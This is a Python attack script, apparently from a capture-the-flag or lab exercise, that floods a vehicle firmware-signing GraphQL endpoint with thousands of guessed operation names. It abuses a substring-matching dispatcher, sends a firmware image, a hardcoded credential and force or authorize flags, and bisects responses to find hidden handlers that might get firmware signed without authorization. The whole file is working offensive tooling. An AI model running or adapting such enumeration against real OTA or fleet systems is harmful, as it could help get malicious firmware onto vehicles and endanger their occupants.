#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Stage I: broad verb x noun shotgun to enumerate ALL operations of the matcher.

Discovery: query text containing "signFirmwareUpdate" dispatches to a real
handler; everything else fell back.  The matcher is a substring test, so a
single request can test ~50 names (validated: a 20 KB query still dispatches).

Goal: find every registered operation, not just signing-related ones, so we can
see how the "update campaign" gate is supposed to be satisfied.
"""
import base64, hashlib, json, os
import requests
from concurrent.futures import ThreadPoolExecutor

HERE = os.path.dirname(os.path.abspath(__file__))
EV = os.path.abspath(os.path.join(HERE, "..", "..", "03_EVIDENCE", "sign"))
URL = "http://10.225.139.2:8080/graphql"
VIN = "CV622697F82A936A1"
CAMP = "CAMP-243892C376D4CB2D5F826953"
CRED = "5e7f07b4a81153ecd5868cc02557f823"
PKG = "3ac02bb40567fa14062cc768e22fefac3dd972aee87a3bf2d01419f026d573d0"
FW = open(os.path.join(HERE, "..", "..", "work", "bundle2", "x", "vcu-reference.bin"), "rb").read()
SHA = hashlib.sha256(FW).hexdigest()
B64 = base64.b64encode(FW).decode()
GUEST = '{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}'

VERBS = ["get", "list", "read", "fetch", "query", "find", "lookup", "load", "view",
         "show", "describe", "inspect",
         "create", "add", "new", "register", "provision", "enroll",
         "update", "set", "modify", "patch", "edit", "change", "assign",
         "delete", "remove", "revoke", "cancel", "abort",
         "validate", "verify", "check", "confirm", "authenticate", "authorize",
         "approve", "reject", "commit", "finalize", "complete", "close",
         "activate", "deactivate", "enable", "disable", "start", "begin", "init",
         "publish", "release", "promote", "stage", "rollout", "deploy", "ship",
         "issue", "grant", "mint", "generate", "derive", "sign", "certify",
         "attest", "endorse", "countersign", "seal",
         "download", "upload", "push", "pull", "submit", "send", "apply",
         "rollback", "reset", "restore", "revert", "force", "override",
         "mark", "flag", "tag", "bind", "unbind", "attach", "link", "associate"]
NOUNS = ["Vehicle", "Vehicles", "Campaign", "Campaigns", "Firmware", "FirmwareUpdate",
         "Update", "Updates", "UpdateCampaign", "Ota", "OtaUpdate", "OtaCampaign",
         "Vcu", "VcuUpdate", "VcuFirmware", "VcuReference", "Package", "Packages",
         "Image", "Bundle", "Artifact", "Signature", "Signing", "SigningRequest",
         "Authorization", "Credential", "Token", "Ticket", "Objective", "Objectives",
         "Diagnostic", "Diagnostics", "Manifest", "Key", "PublicKey", "Certificate",
         "Rollback", "RollbackCounter", "Slot", "Generation", "Task", "Job",
         "Release", "Software", "Ecu", "Fleet", "Engineering", "UpdateRequest",
         "FirmwareSignature", "UpdateSignature", "VehicleUpdate", "CampaignUpdate",
         "OtaPackage", "FirmwarePackage", "UpdatePackage", "SignFirmwareUpdate",
         "Final", "Flag", "Audit"]

NAMES = set()
for v in VERBS:
    for n in NOUNS:
        NAMES.add(v + n)
NAMES |= set(VERBS)
NAMES |= set(NOUNS)
NAMES.add("signFirmwareUpdate")
NAMES = sorted(n for n in NAMES if n)
print(f"[*] {len(NAMES)} names")

VARS = {"vin": VIN, "campaignId": CAMP, "campaign": CAMP, "rollback": 2,
        "rollbackCounter": 2, "firmware": B64, "firmwareBase64": B64,
        "firmwareHex": FW.hex(), "sha256": SHA, "digest": SHA, "hash": SHA,
        "firmwareSha256": SHA, "size": 1024, "length": 1024, "address": "0x08040000",
        "updateAddress": "0x08040000", "vcuUpdateAddress": "0x08040000",
        "packageKey": PKG, "firmwareCredential": CRED, "credential": CRED,
        "vcuReference": B64, "image": B64, "payload": B64, "data": B64,
        "reference": B64, "vcuRollback": 2, "vcuReferenceSize": 1024,
        "vehicleId": VIN, "targetVin": VIN, "slot": "vcu", "ecU": "vcu",
        "cu": "vcu", "t": "vcu", "signature": SHA, "sig": SHA,
        "signed": True, "sign": True, "authorize": True, "commit": True,
        "force": True, "type": "ECDSA-P256", "alg": "ECDSA-P256",
        "curve": "P-256", "hashAlg": "SHA-256", "nonce": "nGYWxAUXYNV3Jwe9",
        "id": CAMP, "updateId": CAMP, "vehicleVin": VIN}
GUEST_KEYS_VARIANTS = [GUEST]


def post(q, v):
    r = requests.post(URL, json={"query": q, "variables": v}, timeout=15)
    return r.status_code, r.text.strip()


def chunk(l, n):
    for i in range(0, len(l), n):
        yield l[i:i + n]


def main():
    # control: make sure the chunks really are being tested
    st, txt = post(" ".join(NAMES[:50]), VARS)
    print("[*] control chunk0:", st, txt[:120])

    jobs = list(chunk(NAMES, 50))
    print(f"[*] {len(jobs)} requests")

    def run(ch):
        st, txt = post(" ".join(ch), VARS)
        return {"chunk": ch, "status": st, "guest": txt == GUEST, "resp": txt[:800]}

    with ThreadPoolExecutor(max_workers=10) as ex:
        res = list(ex.map(run, jobs))
    json.dump(res, open(os.path.join(EV, "I_broad_shotgun.json"), "w"), indent=1)
    bad = [r for r in res if not r["guest"]]
    print(f"[*] non-guest chunks: {len(bad)}")
    found = []
    for r in bad:
        cand = r["chunk"]
        while len(cand) > 1:
            mid = len(cand) // 2
            a, b = cand[:mid], cand[mid:]
            if post(" ".join(a), VARS)[1] != GUEST:
                cand = a
            else:
                cand = b
        st, txt = post(cand[0], VARS)
        found.append({"name": cand[0], "status": st, "resp": txt[:800]})
        print(f"  >>> HIT {cand[0]:26s} {st} {txt[:200]}")
    json.dump(found, open(os.path.join(EV, "I_broad_bisected.json"), "w"), indent=1)
    print("[*] hits:", [f["name"] for f in found])


if __name__ == "__main__":
    main()
